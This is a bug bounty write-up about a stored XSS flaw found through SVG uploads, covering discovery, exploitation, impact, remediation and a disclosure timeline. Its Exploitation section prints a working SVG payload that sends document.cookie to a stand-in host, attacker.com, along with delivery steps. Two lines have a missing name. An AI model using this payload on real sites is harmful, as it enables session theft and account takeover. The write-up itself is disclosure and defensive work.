# [01] Stored XSS via SVG Upload

**Target:** Private Bug Bounty Program  
**Type:** Stored Cross-Site Scripting (XSS)  
**Severity:** High  
**Status:** Fixed ✅

---

## Summary

A file upload endpoint accepted SVG files without sanitizing their content.  
By uploading a crafted SVG with embedded JavaScript, the payload executed in the context of any user who viewed the uploaded file.

---

## Discovery

While testing a file sharing feature, I noticed the app allowed SVG uploads and served them directly without converting to a safe format (e.g. PNG).

Checked the Content-Type header on retrieval:
```
Content-Type: image/svg+xml
```

This means the browser renders the SVG as HTML — including any embedded script.

---

## Exploitation

**Payload (evil.svg):**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    document.location="https://attacker.com/steal?c="+document.cookie;
  </script>
</svg>
```

Steps:
1. Upload  as a profile picture / attachment
2. Copy the direct URL of the uploaded file
3. Send the URL to any logged-in user
4. When they open it, cookies are exfiltrated to attacker server

**Result:** Successfully stole session cookie of a test account. Full account takeover possible.

---

## Impact

- Session hijacking for any user who views the file
- Account takeover
- Potential for worm-like propagation in social features

---

## Remediation

1. Convert all uploaded images to a safe raster format (PNG/JPEG) server-side
2. If SVG must be preserved, sanitize with DOMPurify or equivalent
3. Serve user-uploaded files from a separate domain (sandboxed origin)
4. Set  to prevent inline rendering

---

## Timeline

| Date | Event |
|------|-------|
| Day 0 | Vulnerability discovered |
| Day 1 | Report submitted via bug bounty platform |
| Day 3 | Triaged as High |
| Day 14 | Fix deployed |
| Day 15 | Reward issued |
